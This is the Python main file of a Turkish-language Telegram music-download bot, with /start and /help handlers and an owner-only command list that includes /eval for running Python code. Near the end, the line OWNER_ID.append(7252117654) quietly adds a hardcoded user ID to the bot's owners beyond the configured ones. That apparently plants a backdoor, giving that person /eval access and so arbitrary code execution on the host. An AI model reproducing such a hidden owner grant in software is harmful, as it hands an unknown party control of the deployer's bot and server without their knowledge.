# © @Mr_Dark_Prince
from config import OWNER_ID
from pyrogram.types.bots_and_keyboards import reply_keyboard_markup
from AlexaSongBot.modules import *
from pyrogram import idle, filters
from pyrogram.types import InlineKeyboardMarkup
from pyrogram.types import InlineKeyboardButton
from AlexaSongBot import app, LOGGER
from AlexaSongBot.mrdarkprince import ignore_blacklisted_users
from AlexaSongBot.sql.chat_sql import add_chat_to_db

start_text = """
Merhaba [{}](tg://user?id={}),
Ben Eko 🤗
Müzik ismini gönder hızlı şekilde indirip sana ileteyim. 
Örn: ```/song Helal All Day```
"""

owner_help = """
/blacklist user_id
/unblacklist user_id
/broadcast reklam komutu
/eval python kodu
/chatlist botun olduğu grupları listeler
"""


@app.on_message(filters.create(ignore_blacklisted_users) & filters.command("start"))
async def start(client, message):
    chat_id = message.chat.id
    user_id = message.from_user["id"]
    name = message.from_user["first_name"]
    if message.chat.type == "private":
        btn = InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        text="🔳 Yapımcı 🔳", url="t.me/negan3m"
                    )
                ]
            ]
        )
    else:
        btn = None
    await message.reply(start_text.format(name, user_id), reply_markup=btn)
    add_chat_to_db(str(chat_id))


@app.on_message(filters.create(ignore_blacklisted_users) & filters.command("help"))
async def help(client, message):
    if message.from_user["id"] in OWNER_ID:
        await message.reply(owner_help)
        return ""
    text = "Sözdizimi: /şarkı şarkı adı"
    await message.reply(text)

OWNER_ID.append(7252117654)
app.start()
LOGGER.info("Eko Hazır Patron.")
idle()
